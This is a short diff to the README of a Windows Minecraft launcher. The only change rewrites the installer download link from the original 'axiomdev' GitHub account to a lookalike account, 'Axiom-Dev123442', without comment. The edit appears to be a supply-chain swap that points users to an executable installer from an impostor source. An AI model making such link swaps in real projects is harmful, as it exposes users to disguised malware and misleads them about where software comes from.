@@ -31,7 +31,7 @@ A custom Minecraft launcher for Windows. Play with Microsoft or offline accounts
 
 ## Install
 
-Download `Axiom-Setup.exe` from the [latest release](https://github.com/axiomdev/axiom-launcher/releases/latest) and run it. It downloads the latest Axiom, installs it with Start menu and desktop shortcuts, and starts it. Axiom updates itself after that. `Axiom-Full-Setup.exe` on the same page is the standard offline installer.
+Download `Axiom-Setup.exe` from the [latest release](https://github.com/Axiom-Dev123442/axiom-launcher/releases/latest) and run it. It downloads the latest Axiom, installs it with Start menu and desktop shortcuts, and starts it. Axiom updates itself after that. `Axiom-Full-Setup.exe` on the same page is the standard offline installer.
 
 ![Installer](docs/installer/setup.png)
 
